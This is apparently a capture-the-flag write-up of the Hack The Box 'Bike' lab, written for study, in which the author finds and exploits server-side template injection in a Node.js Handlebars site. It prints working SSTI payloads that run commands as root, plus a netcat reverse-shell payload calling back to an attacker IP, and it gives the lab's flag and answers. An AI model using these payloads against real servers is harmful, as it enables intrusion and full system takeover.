# Bike (Tier 1)

## <mark style="color:blue;">Description</mark>

* **Tier&#x20;**<mark style="color:green;">**->**</mark>**&#x20;1**
* **Difficult** <mark style="color:green;">**->**</mark> Very Easy
* **OS** <mark style="color:green;">**->**</mark> Linux
* **Tags&#x20;**<mark style="color:green;">**->**</mark> Custom Applications / NodeJS / Reconnaissance / Remote Code Execution\
  &#x20;             / Server Side Template Injection (SSTI)

<figure><img src="../../.gitbook/assets/image (352).png" alt=""><figcaption><p><a href="https://app.hackthebox.com/starting-point?tier=1">https://app.hackthebox.com/starting-point?tier=1</a></p></figcaption></figure>

## <mark style="color:blue;">Write-up</mark>

* I started doing an initial scan using [_Nmap_](../../networks/tools-and-utilities.md#nmap)

{% code lineNumbers="true" %}
```bash
nmap 10.129.97.64 -p- -Pn --min-rate 2500 -oN scan.txt
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (299).png" alt=""><figcaption></figcaption></figure>

***

* With this, I answered the first question

<figure><img src="../../.gitbook/assets/image (298).png" alt=""><figcaption></figcaption></figure>

> Answer: _**22,80**_

***

* Then I did an exhaustive scan to learn more about the services running on the open ports

<pre class="language-basic" data-line-numbers><code class="lang-basic"><strong>nmap 10.129.97.64 -p22,80 -sVC -oN serv_scan.txt
</strong></code></pre>

<figure><img src="../../.gitbook/assets/image (302).png" alt=""><figcaption></figcaption></figure>

***

* With this, I answered the next question

<figure><img src="../../.gitbook/assets/image (300).png" alt=""><figcaption></figcaption></figure>

> Answer: _**Node.js**_

***

* As I found the HTTP service on port 80, I went to the browser to check the content being deployed. I found a simple website where I could submit an email address and send this information. After filling out the form and hitting the _Submit_ button, I obtained a response from the website, including the information submitted

<figure><img src="../../.gitbook/assets/image (306).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (304).png" alt=""><figcaption></figcaption></figure>

{% hint style="success" %}
To learn more about the HTTP protocol, you can go [here](../../networks/protocols/http/)
{% endhint %}

***

* I reviewed the source code but didn't find anything interesting, so to learn more about the components of the website, I used the [_Wappalyzer_](../../web-exploitation/tools-and-utilities.md#wappalyzer) extension

<figure><img src="../../.gitbook/assets/image (307).png" alt=""><figcaption></figcaption></figure>

***

* With this and a little research, I answered the next questions

<figure><img src="../../.gitbook/assets/image (308).png" alt=""><figcaption></figcaption></figure>

> Answer: _**Express**_

***

<figure><img src="../../.gitbook/assets/image (309).png" alt=""><figcaption></figcaption></figure>

> Answer: _**Server Side Template Injection**_

***

* To test some vulnerabilities in the insertion point, I inserted some XSS payloads in the form, but didn't get any results. So after that, I tried with some SSTI payloads and noticed that using an input of _\{{7\*7\}}_ I caused an error on the page, letting us know it could be vulnerable to this attack

<figure><img src="../../.gitbook/assets/image (317).png" alt=""><figcaption></figcaption></figure>

{% hint style="success" %}
To learn more about Cross-Site Scripting (XSS) attacks, you can go [here](../../web-exploitation/broken-access-control/cross-site-scripting.md), and to learn more about Server-Side Template Injection (SSTI) attacks, you can go [here](../../web-exploitation/broken-access-control/server-side-template-injection.md)
{% endhint %}

***

* This gave me information about some folders and components being used by the server to deploy the web page, for example, that it was using the [_Handlebars_](https://www.npmjs.com/package/handlebars) template engine. So I reviewed some vector attacks for this engine, and with some [research](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#handlebars-nodejs), I found a payload to abuse it

{% code title="SSTI_Found_Payload" overflow="wrap" lineNumbers="true" %}
```handlebars
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').exec('whoami');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```
{% endcode %}

***

* With this and a little research, I answered the next question

<figure><img src="../../.gitbook/assets/image (310).png" alt=""><figcaption></figcaption></figure>

> Answer: _**Handlebars**_

***

* After that, I intercept the petition sent to modify the content and send this payload. To do so, I used [_FoxyProxy_](../../web-exploitation/tools-and-utilities.md#foxyproxy) to intercept the petition and send it to [_Burp Suite_](../../web-exploitation/tools-and-utilities.md#burp-suite) to modify it. After catching it with the proxy, I sent it to the _Repeater_ tab to resend it

<figure><img src="../../.gitbook/assets/image (322).png" alt=""><figcaption></figcaption></figure>

***

* I noticed the site was encoding the values in URL format, so to ensure the page would process the payload correctly, I did the same process in the _Decoder_ tab. After that, I resent the petition and got a different error from the site

<figure><img src="../../.gitbook/assets/image (324).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (323).png" alt=""><figcaption></figcaption></figure>

***

* With this and a little research, I answered the next questions

<figure><img src="../../.gitbook/assets/image (311).png" alt=""><figcaption></figcaption></figure>

> Answer: _**Decoder**_

***

<figure><img src="../../.gitbook/assets/image (312).png" alt=""><figcaption></figcaption></figure>

> Answer: _**URL**_

***

<figure><img src="../../.gitbook/assets/image (314).png" alt=""><figcaption></figcaption></figure>

> Answer: _**require**_

***

<figure><img src="../../.gitbook/assets/image (588).png" alt=""><figcaption></figcaption></figure>

> Answer: _**global**_

***

* Searching about this error, I found out it was because the _require_ function used in line 9 of our payload couldn't be in the internal environment of the deployment, so I had to find a way to modify it for my purposes. After a little [research](https://nodejs.org/api/process.html#processmainmodule), we found an alternative to the use of the _require_ function via the _process.mainModule_ property. So I adapted the payload to work with this and resent it

{% code title="SSTI_New_Payload" overflow="wrap" lineNumbers="true" %}
```handlebars
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return process.mainModule.require('child_process').exec('whoami');"}} 
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (325).png" alt=""><figcaption></figcaption></figure>

***

* I noticed the server processed it without errors, but instead of executing the command was returning what seemed to be _JavaScript_ objects. This could be because the _exec_ function was not available within the environment context. After a lot of [research](https://nodejs.org/api/child_process.html), I found other possible functions from the _child\_process_ module that could let us execute commands. Trying all possible options, we found that by using the _execSync_ function and resending the petition, I finally made it work

{% code title="SSLI_Final_Payload" overflow="wrap" lineNumbers="true" %}
```handlebars
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return process.mainModule.require('child_process').execSync('whoami');"}} 
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (586).png" alt=""><figcaption></figcaption></figure>

***

* With this, I answered the next question

<figure><img src="../../.gitbook/assets/image (589).png" alt=""><figcaption></figcaption></figure>

> Answer: _**root**_

***

* That revealed I had gained _RCE_ as the _root_ user, so by abusing this method, I listed the files from the _/root_ folder. There I found a _flag.txt_ file, and once again, used the _RCE_ to read the content of this file, which gave me the flag

<figure><img src="../../.gitbook/assets/image (328).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (584).png" alt=""><figcaption></figcaption></figure>

***

* With this, I got the root flag and pwned the machine

<figure><img src="../../.gitbook/assets/image (245) (1).png" alt=""><figcaption></figcaption></figure>

> Answer: _**6b258d726d287462d60c103d0142a81c**_

## <mark style="color:blue;">Alternative Reverse Shell</mark>

* I tried to gain a reverse shell by abusing the RCE and sending a proper payload. I started sending a [_Netcat_ ](../../networks/tools-and-utilities.md#netcat)listener on my machine and sent the petition with the payload

{% code overflow="wrap" lineNumbers="true" %}
```bash
nc -nlvp 4444
```
{% endcode %}

{% code title="SSLI_RevShell" overflow="wrap" lineNumbers="true" %}
```handlebars
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return process.mainModule.require('child_process').execSync('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.5 4444 >/tmp/f');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (591).png" alt=""><figcaption></figcaption></figure>

***

* I observed that I didn't receive any response from the server, but checking the listener, I had caught a shell as the _root_ user

<figure><img src="../../.gitbook/assets/image (590).png" alt=""><figcaption></figcaption></figure>
